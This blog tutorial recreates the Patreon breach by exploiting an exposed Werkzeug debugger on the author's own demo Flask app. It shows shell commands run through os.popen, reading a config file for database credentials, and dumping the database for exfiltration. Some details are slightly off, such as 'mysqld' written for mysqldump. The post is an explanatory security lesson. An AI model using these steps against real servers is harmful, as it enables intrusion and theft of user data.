# Intro

In my [previous post in this series](http://raphael-enochian.tumblr.com/post/133000006820/go-ahead-expose-your-web-debugger-to-the), I gave a rundown on the recent Patreon hack. I analyzed the attack, security breaches, the source code, and the data dump. In this article, I will reconstruct and demonstrate the exploit itself used by the hackers by attacking  a demo [`Flask`](http://flask.pocoo.org/) server.

> **DISCLAIMER**: *Do not attempt to run this exploit against a server that you don't personally own, or explicitly have permission to do so. I am not liable for any damages or stupidity caused by this demo.*

## Some terms

* **Web framework** - A software library that easies the process of programmatically building a website and its services. [What is a Web Framework?](http://stackoverflow.com/a/4507543)
* **[`Flask`](http://flask.pocoo.org/)** - A web framework for building web applications with the Python programming language. It's light-weight, small, modular, and extensible, and is therefore called a *microframeworks*. Web microframeworks have been gaining a lot of traction in the past few years over older monolithic frameworks like `Ruby on Rails` and `Django`. Other popular examples of web microframeworks include `Sinatra` (Ruby) and `Node.js` (JavaScript). Flask is well established in the web developer community, powering either wholly or partially many popular websites: Pinterest, Twilio, Linked-In, Apple, and Obama's 2012 Election website.
* **[`Werkzeug`](http://werkzeug.pocoo.org/)** - the utility library for Flask that is used (or should be used) only in the development environment. It comes with a powerful in-browser debugger, and has services for hosting a local development web server.

## Setting the Stage

This exploit uses the `Werkzeug` version `0.9.6` -- the same version of Werkzeug running on the Patreon servers (according to the source code dump of the `venv` directory). This hack may not work on newer version of `Werkzeug`, which has since been updated with some security changes, like a debugger PIN code ([changelog for Werkzeug 0.11](https://github.com/mitsuhiko/werkzeug/blob/master/CHANGES#L54), line 54).

Let's begin by creating a basic Flask app with two endpoints: `index` and `error`.

`my-flask-app.py`

    from flask import Flask
    app = Flask(__name__)

    @app.route('/')
    def index():
        return "Hello, hacker!"

    @app.route('/error')
    def my_error():
        return 3 / 0

    app.run(debug=True, port=7777)

Next, we run the server.

    $ python my-flask-app.py
     * Running on http://127.0.0.1:7777/
     * Restarting with reloader

We now have a fully-fledged Flask application running with a WSGI server.

Open up a web browser and navigate to `http://127.0.0.1:7777`

![Working flask server](./1-hello-world.png)

## Enter Werkzeug Debugger
Because we specified the `debug=True` argument, the Werkzeug debugger is now active. That means, if any errors occur server-side, the powerful Werkzeug debugger is exposed. Some scenarios where this may occur when the debug=True flag is set:

 * Unhandled exceptions
 * Faulty server-side code
 * Environment or other system state factors have changed that the server-side code assumed
 * Client-side intervention by passing faulty data that the app doesn't know how to handle (or again, unhandled exceptions)

Otherwise, Flask will return a 500 "Internal Server Error", or whatever you want to specify the return code as.

All's said and done, it's best practice to simply **disable** the Werkzeug debugger when the server goes live -- and for whatever reason, Patreon didn't.

For simplicity's sake, we'll be using faulty server-side code in order to invoke the Werkzeug debugger. When the user navigates to the `error` endpoint, the server will try to divide 3 by 0, raising a `ZeroDivisionError`.

![Werkzeug](./2-werkzeug.png)

It's pretty powerful. Potentially useful for a developer and QA. And **extremely** useful for a hacker, as we will see.

Werkzeug allows you to open up an **interactive shell** right there in the browser. This shell can run arbitrary code against a Python interpreter, and has access to **all** the underlying server, application, and system information.

In the words of Crazy Horse, "it's a good day to die."

## Remote Code Execution inside the browser

When your application exposes the ability for the end-user to inject arbitrary code, it's **game over**. I could just call it a day right here, but let's continue my exploit.

![](./3-werkzeug.png)
And we can run arbitrary code *indeed*. Here I've imported the `os` module, which allows you to inspect and manipulate the underlying system. I then invoked a command to view all of the environment variables, thereby exposing details about the username, the shell, the system, etc. You can also use the `os` module to run commands directly against the system:

    >>> cmd_output = os.popen('ls -la').read()
    >>> print(cmd_output)
    my-flask-app.py
    server.conf


At this point, provided you know some basic Python or how to do a Google search, it's *trivial* to exploit this system.

Let's simplify our *remote code execution* by defining a `lambda`, so we're not typing `os.popen(<command>).read()` every time. Make sure to send your command as a `string`.

    >>> rex = lambda cmd, os=os: print(os.popen(cmd).read())
    >>> rex('uname -a')
    Linux my-computer 4.2.5-1-ARCH #1 SMP PREEMPT Tue Oct 27 08:13:28 CET 2015 x86_64 GNU/Linux

`rex`, short for **Remote EXecution**, is one of my favorite lambdas / single-line functions. We go back to my old Perl days in the warez scene. `rex` has always treat me very, *very* well.

Now, we want to find the login credentials to access the MySQL database, in order to get all of the user data. We inspect that shiney `server.conf` file we saw when we first invoked `ls`.

    >>> rex('cat server.conf')
    PROJECT_NAME = 'My Flask App'
    SQLALCHEMY_DATABASE_URI = 'mysql://root:root@10.0.2.15:3306/my_flask_app'

`SQLALCHEMY_DATABASE_URI` is a connection string that the Flask app uses to connect to its database. This connection string has all the information we need access to the MySQL server: username, password, IP address, port, and database name.

Let me just pause right here and say that it's a **terrible** practice to store your passwords and configuration files in plaintext. Had Patreon encrypted their configuration files, there's a good chance the hackers wouldn't have gained access to the MySQL database (and all that user info), and the hack would have stopped right here.

## Reverse Shell, mysqldump

You could use Werkzeug here to execute a Python script that opens up an SSH connection into the machine, and connect from there. In penetration testing, we call this a `Reverse Shell`, but this topic deserves its own post. Actually, technically speaking, Werkzeug itself *is* a Reverse Shell.

Let's dump the mysql database using `mysqldump`, just like how the Patreon hackers did it.

![mysqldump](5-mysqldump.png)

(you can use `-h` for `host` and `-P` for port, but in this demo, the MySQL server is running on the same machine as the application server.)

Here's some faux customer data that was in our demo database:

![mysqldump](6-mysqldump.png)

At that point it's as easy as scraping the page for the dump (or using copy and paste). Or, better -- as the Patreon database was a 15gb file -- we can redirect the dump into a file:

    >>> rex('mysqld -u root -proot my_flask_app > app_dump.sql')

... and use a command-line utility like **scp** or **ftp** to save it to an endpoint we exposed on the Internet.

And that's how the hackers did it.

## Final thoughts
Do realize that all of these steps above can, and have already been automated by people wishing to test this vulnerability against their own systems -- meaning any script kiddie with `Metasploit`, or any bot with the right script, can do this.

The bottom line is:
#**`Don't expose your debugger in production!`**
